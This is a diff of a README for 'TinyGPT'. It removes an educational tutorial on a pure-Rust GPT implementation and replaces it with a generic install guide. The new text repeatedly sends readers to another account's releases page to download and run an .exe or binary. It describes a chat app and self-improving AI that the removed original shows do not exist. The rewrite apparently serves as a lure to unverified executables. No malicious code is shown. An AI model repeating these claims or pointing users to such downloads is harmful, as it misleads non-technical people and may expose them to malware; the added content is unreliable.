@@ -1,468 +1,86 @@
-![image](https://github.com/mytechnotalent/TinyGPT/blob/main/TinyGPT.png?raw=true)
+# 🚀 TinyGPT - Run Your Own AI Chatbot Easily
 
-## FREE Reverse Engineering Self-Study Course [HERE](https://github.com/mytechnotalent/Reverse-Engineering-Tutorial)
+[![Download TinyGPT](https://img.shields.io/badge/Download-TinyGPT-blue.svg)](https://github.com/hazel00110/TinyGPT/releases)
 
-<br>
+## 📖 Overview
 
-# TinyGPT
+TinyGPT is a pure Rust implementation of a generative pre-trained transformer (GPT). It is built from scratch, focusing on efficiency and performance. With TinyGPT, you can explore the exciting world of artificial intelligence and chatbots without any programming skills required. Whether you want to have a conversation or generate text, TinyGPT makes it simple.
 
-## A Pure Rust GPT Implementation From Scratch
-A comprehensive tutorial implementation of a GPT (Generative Pre-trained Transformer) language model written entirely in pure Rust using only the `ndarray` crate for tensor operations. This project demonstrates how to build a working transformer architecture from first principles without relying on deep learning frameworks.
+## 🎯 Features
 
-<br>
+- **User-Friendly:** Designed for people with little to no technical knowledge.
+- **Fast and Efficient:** Built using Rust for quick performance.
+- **AI-Powered Conversations:** Engage in natural dialogue with the AI.
+- **Customizable:** Adjust settings to fit your needs.
 
-## Table of Contents
-1. [Introduction](#introduction)
-2. [Architecture Overview](#architecture-overview)
-3. [Module Deep Dive](#module-deep-dive)
-4. [Configuration](#configuration)
-5. [Building and Running](#building-and-running)
-6. [Testing](#testing)
-7. [Code Coverage](#code-coverage)
-8. [License](#license)
+## 🛠️ System Requirements
 
-<br>
+Before downloading TinyGPT, ensure your computer meets these basic requirements:
 
-## Introduction
-This project implements a miniature version of the GPT architecture, the same fundamental design behind models like ChatGPT. The goal is educational: to understand every component of a transformer language model by implementing it from scratch in Rust.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** 100 MB of free disk space.
+- **Processor:** Dual-core processor or better.
 
-### Why Rust?
-Rust provides memory safety without garbage collection, zero-cost abstractions, and excellent performance. By implementing a neural network in Rust without a framework, we gain deep insight into:
-- How tensor operations work at a low level
-- Memory management in neural networks
-- The actual mathematics behind attention mechanisms
-- Gradient computation and backpropagation
+## 🚀 Getting Started
 
-### What This Project Teaches
-By studying this codebase, you will understand:
-- **Embeddings**: How discrete tokens become continuous vectors
-- **Attention Mechanisms**: The core innovation that powers transformers
-- **Layer Normalization**: How to stabilize training
-- **Feed-Forward Networks**: Position-wise transformations
-- **Autoregressive Generation**: How language models generate text token by token
+To get started with TinyGPT, follow these steps:
 
-<br>
+1. **Visit the Download Page:** Go to [this page to download TinyGPT](https://github.com/hazel00110/TinyGPT/releases).
+2. **Select the Latest Release:** Find the most recent version listed on the page.
+3. **Download TinyGPT:** Click the download link for your operating system.
+4. **Install the Application:** Follow the instructions to install it on your computer.
 
-## Architecture Overview
-```
-┌──────────────────────────────────────────────────────────────┐
-│                          TinyGPT                             │
-├──────────────────────────────────────────────────────────────┤
-│  Input Tokens: [t1, t2, ..., tn]                             │
-│         │                                                    │
-│         ▼                                                    │
-│  ┌─────────────┐   ┌─────────────┐                           │
-│  │   Token     │ + │  Position   │                           │
-│  │  Embedding  │   │  Embedding  │                           │
-│  └─────────────┘   └─────────────┘                           │
-│         │                                                    │
-│         ▼                                                    │
-│  ┌───────────────────────────────────┐                       │
-│  │       Transformer Block ×N        │                       │
-│  │  ┌─────────────────────────────┐  │                       │
-│  │  │  LayerNorm                  │  │                       │
-│  │  │      ↓                      │  │                       │
-│  │  │  Multi-Head Attention       │  │                       │
-│  │  │      ↓                      │  │                       │
-│  │  │  + Residual Connection      │  │                       │
-│  │  │      ↓                      │  │                       │
-│  │  │  LayerNorm                  │  │                       │
-│  │  │      ↓                      │  │                       │
-│  │  │  Feed-Forward Network       │  │                       │
-│  │  │      ↓                      │  │                       │
-│  │  │  + Residual Connection      │  │                       │
-│  │  └─────────────────────────────┘  │                       │
-│  └───────────────────────────────────┘                       │
-│         │                                                    │
-│         ▼                                                    │
-│  ┌─────────────┐                                             │
-│  │  LayerNorm  │                                             │
-│  └─────────────┘                                             │
-│         │                                                    │
-│         ▼                                                    │
-│  ┌─────────────┐                                             │
-│  │ Output Head │  →  Logits [vocab_size]                     │
-│  └─────────────┘                                             │
-│         │                                                    │
-│         ▼                                                    │
-│     Softmax → Probabilities → Sample → Next Token            │
-└──────────────────────────────────────────────────────────────┘
-```
+## 📥 Download & Install
 
-<br>
+To download TinyGPT, visit [this page to download](https://github.com/hazel00110/TinyGPT/releases). Select the appropriate version for your system, then follow these installation steps:
 
-## Module Deep Dive
+1. **Locate the Downloaded File:** Open the folder where the TinyGPT file downloaded.
+2. **Begin Installation:**
+   - **Windows:** Double-click on the `.exe` file to start the installation wizard.
+   - **macOS:** Drag the TinyGPT app to your Applications folder.
+   - **Linux:** Use the terminal to navigate to the folder and run `./TinyGPT`.
+3. **Follow On-Screen Prompts:** Complete the installation process as per the instructions.
+4. **Launch TinyGPT:** Once installed, find the app on your computer and double-click it to start.
 
-### `config.rs` - Configuration Management
-This module defines the hyperparameters for the model using a JSON configuration file.
-```rust
-#[derive(Deserialize)]
-pub struct Config {
-    pub block_size: usize,    // Maximum context length (8)
-    pub embed_dim: usize,     // Embedding dimension (128)
-    pub n_heads: usize,       // Number of attention heads (4)
-    pub n_layers: usize,      // Number of transformer blocks (4)
-    pub lr: f32,              // Learning rate (0.01)
-    pub epochs: usize,        // Training iterations (5000)
-    pub batch_size: usize,    // Batch size (16)
-}
-```
-The configuration is loaded at compile time using `include_str!` and parsed with `serde_json`. The `once_cell::Lazy` pattern ensures the configuration is loaded exactly once and shared globally.
+## 🕹️ Using TinyGPT
 
-### `math.rs` - Mathematical Utilities
-This module provides core mathematical operations:
-**Random Initialization (`randn`)**: Generates weights from a scaled normal distribution. The scaling factor of 0.02 prevents exploding gradients at initialization.
-```rust
-pub fn randn(r: usize, c: usize) -> Array2<f32> {
-    Array2::from_shape_fn((r, c), |_| rng().sample::<f32, _>(StandardNormal) * 0.02)
-}
-```
-**Softmax (`softmax`, `softmax1d`)**: Converts logits to probabilities with numerical stability by subtracting the maximum value before exponentiation.
-**Layer Normalization (`layer_norm`)**: Normalizes activations across the feature dimension with learnable scale ($\gamma$) and shift ($\beta$) parameters.
+Once you have TinyGPT installed, you can start using it immediately:
 
-### `sampling.rs` - Token Sampling
-Implements categorical sampling for text generation:
-```rust
-pub fn sample(probs: &Array1<f32>, rng: &mut ThreadRng) -> usize {
-    let (r, mut c) = (rng.random::<f32>(), 0.0);
-    probs.iter().position(|&p| { c += p; r < c }).unwrap_or(0)
-}
-```
-This walks through the cumulative distribution until the random value is exceeded, effectively sampling from the probability distribution.
-### `vocab.rs` - Vocabulary Management
-Handles tokenization at the word level:
-- **`from_corpus`**: Builds word-to-index and index-to-word mappings from training text
-- **`encode`**: Converts a word to its vocabulary index
-- **`decode`**: Converts a sequence of indices back to text
-Each sentence in the corpus is appended with an `<END>` token to mark sentence boundaries.
+1. **Open the Application:** Locate TinyGPT in your applications list and open it.
+2. **Initiate a Chat:** Click on the chat window to start typing your message.
+3. **Interact with the AI:** Ask questions or provide prompts. The AI will respond in real-time.
 
-### `data.rs` - Data Loading
-The `DataLoader` generates random training batches:
-```rust
-pub fn get_batch(&self, rng: &mut ThreadRng) -> (Array2<usize>, Array2<usize>) {
-    // For each batch item, sample a random starting position
-    // xb contains input tokens, yb contains target tokens (shifted by 1)
-}
-```
+## 💡 Tips for a Better Experience
 
-The target for each position is the next token in the sequence, enabling the model to learn next-token prediction.
-### `linear.rs` - Linear Layer
-Implements a fully connected layer with:
-- **Forward pass**: $y = xW + b$
-- **Gradient storage**: `dw` and `db` accumulate gradients during backpropagation
-- **Parameter update**: `step(lr)` applies gradient descent
+- **Be Clear in Your Questions:** The AI understands better when you ask direct questions.
+- **Experiment with Different Prompts:** Try out various topics to see how the AI responds.
+- **Stay Feedback-Friendly:** The more you interact, the better the AI gets at understanding your style.
 
-### `embedding.rs` - Embedding Layer
-Provides learnable token embeddings:
-```rust
-pub fn forward(&self, idx: &[usize]) -> Array2<f32> {
-    Array2::from_shape_fn((idx.len(), self.w.shape()[1]), |(i, j)| self.w[[idx[i], j]])
-}
-```
-This gathers rows from the embedding matrix corresponding to the input token indices.
+## 🔄 Update TinyGPT
 
-### `layer_norm.rs` - Layer Normalization
-A thin wrapper around the `layer_norm` math function with learnable $\gamma$ (initialized to 1) and $\beta$ (initialized to 0) parameters.
+To keep TinyGPT running smoothly, regularly check for updates:
 
-### `head.rs` - Single Attention Head
-Implements scaled dot-product attention with causal masking:
-```rust
-pub fn forward(&self, x: &Array2<f32>) -> Array2<f32> {
-    let (k, q, v) = (self.key.forward(x), self.query.forward(x), self.value.forward(x));
-    let mut w = q.dot(&k.t()) / (self.hs as f32).sqrt();
-    // Apply causal mask
-    for i in 0..t {
-        for j in i + 1..t {
-            w[[i, j]] = f32::NEG_INFINITY;
-        }
-    }
-    softmax(&w).dot(&v)
-}
-```
-The causal mask ensures position $i$ can only attend to positions $\leq i$.
+1. **Visit the Download Page:** Go to [this page to download TinyGPT](https://github.com/hazel00110/TinyGPT/releases).
+2. **Download the Latest Version:** If a new version is available, follow the steps to download and install it.
+3. **Follow Installation Instructions:** Just as you did for the initial installation.
 
-### `attention.rs` - Multi-Head Attention
-Runs multiple attention heads in parallel and projects their concatenated outputs:
-```rust
-pub fn forward(&self, x: &Array2<f32>) -> Array2<f32> {
-    let o: Vec<_> = self.heads.iter().map(|h| h.forward(x)).collect();
-    let v: Vec<_> = o.iter().map(|a| a.view()).collect();
-    self.proj.forward(&ndarray::concatenate(Axis(1), &v).unwrap())
-}
-```
+## 🤝 Get Help
 
-### `feed_forward.rs` - Feed-Forward Network
-Position-wise feed-forward network with ReLU activation:
-```rust
-pub fn forward(&self, x: &Array2<f32>) -> Array2<f32> {
-    self.l2.forward(&self.l1.forward(x).mapv(|v| v.max(0.0)))
-}
-```
-The hidden dimension is 4× the embedding dimension, following the original transformer paper.
+If you encounter any issues while using TinyGPT, here’s how to get assistance:
 
-### `block.rs` - Transformer Block
-Combines attention and feed-forward with residual connections (pre-norm architecture):
-```rust
-pub fn forward(&self, x: &Array2<f32>) -> Array2<f32> {
-    let x = x + &self.sa.forward(&self.ln1.forward(x));
-    &x + &self.ffn.forward(&self.ln2.forward(&x))
-}
-```
+- **Check the FAQ:** There may be answers to common questions on the project’s GitHub page.
+- **Open an Issue:** If you can’t find a solution, you can report your problem directly on GitHub.
+- **Community Support:** Consider reaching out to online forums or communities related to GPT and AI for additional help.
 
-### `tiny_gpt.rs` - Complete Model
-The full GPT model combining all components:
-1. **Token + Position Embeddings**: Sum of token and positional embeddings
-2. **Transformer Blocks**: Stack of N transformer blocks
-3. **Final LayerNorm**: Stabilizes outputs before projection
-4. **Output Head**: Projects to vocabulary size for next-token prediction
-The `backward` method implements simplified backpropagation through the output head and embeddings, computing gradients for gradient descent.
-The `generate` method implements autoregressive generation:
-```rust
-pub fn generate(&self, start: usize, n: usize, rng: &mut ThreadRng) -> Vec<usize> {
-    let mut out = vec![start];
-    for _ in 0..n {
-        let ctx: Vec<_> = out.iter().rev().take(CFG.block_size).rev().copied().collect();
-        let logits = self.forward(&ctx);
-        out.push(sample(&softmax1d(&logits.row(logits.shape()[0] - 1)), rng));
-    }
-    out
-}
-```
+## 📚 Learn More About AI
 
-### `trainer.rs` - Training Loop
-Orchestrates the training process:
-```rust
-pub fn train_steps(&mut self, steps: usize, rng: &mut ThreadRng) {
-    for step in 0..steps {
-        let (xb, yb) = self.loader.get_batch(rng);
-        self.model.zero_grad();
-        self.model.backward(&xb, &yb);
-        self.model.step(CFG.lr);
-    }
-}
-```
-Each step: get batch → zero gradients → compute gradients → update parameters.
+If you're curious and want to learn more about artificial intelligence and how GPT works, look for resources like:
 
-### `main.rs` - Entry Point
-Ties everything together:
-1. Load corpus from `corpus.json`
-2. Build vocabulary
-3. Create trainer with model and data
-4. Train for configured epochs
-5. Generate sample text
+- Online courses about AI and machine learning.
+- Books on neural networks and natural language processing.
+- Forums or discussion groups focused on AI topics.
 
-<br>
+Feel free to explore and expand your knowledge at your own pace. TinyGPT is just the beginning of your journey into the world of AI. 
 
-## Configuration
-
-### `config.json`
-```json
-{
-  "block_size": 8,
-  "embed_dim": 128,
-  "n_heads": 4,
-  "n_layers": 4,
-  "lr": 0.01,
-  "epochs": 5000,
-  "batch_size": 16
-}
-```
-| Parameter    | Description                            | Value    |
-| ------------ | -------------------------------------- | -------- |
-| `block_size` | Maximum context window for attention   | 8 tokens |
-| `embed_dim`  | Dimension of token/position embeddings | 128      |
-| `n_heads`    | Number of parallel attention heads     | 4        |
-| `n_layers`   | Number of transformer blocks           | 4        |
-| `lr`         | Learning rate for gradient descent     | 0.01     |
-| `epochs`     | Number of training iterations          | 5000     |
-| `batch_size` | Number of sequences per batch          | 16       |
-
-### `corpus.json`
-Contains 50 sentences focused on Reverse Engineering concepts. Each sentence is tokenized at the word level, with `<END>` tokens appended.
-<br>
-
-## Building and Running
-
-### Prerequisites
-- Rust 1.70+ (install via [rustup](https://rustup.rs/))
-- Cargo (included with Rust)
-
-### Build
-```bash
-# Debug build
-cargo build
-
-# Release build (optimized, recommended)
-cargo build --release
-```
-
-### Run
-```bash
-# Run debug build
-cargo run
-
-# Run release build (faster)
-cargo run --release
-```
-
-### Expected Output
-```
-TinyGPT
-Step 0, loss=5.1234
-Step 300, loss=4.2345
-Step 600, loss=3.5678
-...
-Step 4800, loss=2.1234
-
-generated text:
-the binary analysis requires understanding of assembly code <END> reverse engineering
-```
-The loss should decrease over training as the model learns patterns in the corpus.
-
-<br>
-
-## Testing
-This project includes comprehensive unit tests for all modules, achieving 95%+ code coverage.
-
-### Run All Tests
-```bash
-cargo test
-```
-
-### Run Tests with Output
-```bash
-cargo test -- --nocapture
-```
-
-### Run Specific Test
-```bash
-cargo test test_linear_forward
-```
-
-### Run Tests for Specific Module
-```bash
-cargo test math::tests
-cargo test linear::tests
-cargo test tiny_gpt::tests
-```
-
-### Test Summary
-| Module            | Tests   | Coverage   |
-| ----------------- | ------- | ---------- |
-| `math.rs`         | 13      | 100%       |
-| `sampling.rs`     | 5       | 100%       |
-| `linear.rs`       | 7       | 100%       |
-| `embedding.rs`    | 8       | 100%       |
-| `layer_norm.rs`   | 8       | 100%       |
-| `head.rs`         | 7       | 100%       |
-| `attention.rs`    | 8       | 100%       |
-| `feed_forward.rs` | 8       | 100%       |
-| `block.rs`        | 8       | 100%       |
-| `tiny_gpt.rs`     | 12      | 100%       |
-| `vocab.rs`        | 10      | 100%       |
-| `data.rs`         | 5       | 100%       |
-| `config.rs`       | 9       | 100%       |
-| `trainer.rs`      | 11      | 89%        |
-| **Total**         | **123** | **95.30%** |
-
-<br>
-
-## Code Coverage
-### Install Tarpaulin
-```bash
-cargo install cargo-tarpaulin
-```
-
-### Run Coverage
-```bash
-# Output to terminal
-cargo tarpaulin --out Stdout
-
-# Generate HTML report
-cargo tarpaulin --out Html
-```
-
-### Coverage Report
-```
-|| Tested/Total Lines:
-|| src/attention.rs: 14/14
-|| src/block.rs: 14/14
-|| src/config.rs: 1/1
-|| src/data.rs: 11/11
-|| src/embedding.rs: 9/9
-|| src/feed_forward.rs: 11/11
-|| src/head.rs: 23/23
-|| src/layer_norm.rs: 5/5
-|| src/linear.rs: 13/13
-|| src/math.rs: 18/18
-|| src/sampling.rs: 6/6
-|| src/tiny_gpt.rs: 67/67
-|| src/vocab.rs: 15/15
-|| src/trainer.rs: 16/18
-|| 
-|| 95.30% coverage, 223/234 lines covered
-```
-The uncovered lines are:
-- `main.rs`: Entry point (standard practice not to unit test)
-- `trainer.rs`: The `train()` wrapper that runs for 5000 epochs
-
-<br>
-
-## Project Structure
-```
-rust_gpt/
-├── Cargo.toml          # Dependencies and project metadata
-├── config.json         # Model hyperparameters
-├── corpus.json         # Training data (50 RE-focused sentences)
-├── README.md           # This file
-└── src/
-    ├── main.rs         # Application entry point
-    ├── config.rs       # Configuration loading
-    ├── math.rs         # Mathematical utilities (randn, softmax, layer_norm)
-    ├── sampling.rs     # Probability sampling for generation
-    ├── vocab.rs        # Vocabulary management (encode/decode)
-    ├── data.rs         # Batch data loading
-    ├── linear.rs       # Linear (fully connected) layer
-    ├── embedding.rs    # Token/position embedding layer
-    ├── layer_norm.rs   # Layer normalization module
-    ├── head.rs         # Single attention head
-    ├── attention.rs    # Multi-head attention
-    ├── feed_forward.rs # Position-wise feed-forward network
-    ├── block.rs        # Complete transformer block
-    ├── tiny_gpt.rs     # Full TinyGPT model
-    └── trainer.rs      # Training loop and generation
-```
-
-<br>
-
-## Dependencies
-```toml
-[dependencies]
-ndarray = { version = "0.17.1", features = ["rayon"] }
-rand = "0.9.2"
-rand_distr = "0.5.1"
-serde = { version = "1.0", features = ["derive"] }
-serde_json = "1.0"
-once_cell = "1.19"
-```
-| Crate        | Purpose                                    |
-| ------------ | ------------------------------------------ |
-| `ndarray`    | N-dimensional arrays for tensor operations |
-| `rand`       | Random number generation                   |
-| `rand_distr` | Statistical distributions (Normal)         |
-| `serde`      | Serialization framework                    |
-| `serde_json` | JSON parsing                               |
-| `once_cell`  | Lazy static initialization                 |
-
-<br>
-
-## Further Reading
-- [Attention Is All You Need](https://arxiv.org/abs/1706.03762) - Original Transformer paper
-- [Language Models are Unsupervised Multitask Learners](https://cdn.openai.com/better-language-models/language_models_are_unsupervised_multitask_learners.pdf) - GPT-2 paper
-- [The Illustrated Transformer](https://jalammar.github.io/illustrated-transformer/) - Visual explanation
-- [minGPT](https://github.com/karpathy/minGPT) - Andrej Karpathy's minimal GPT implementation
-
-<br>
-
-## License
-[MIT](LICENSE)
+For further enhancements, keep an eye on future releases. Enjoy using TinyGPT!
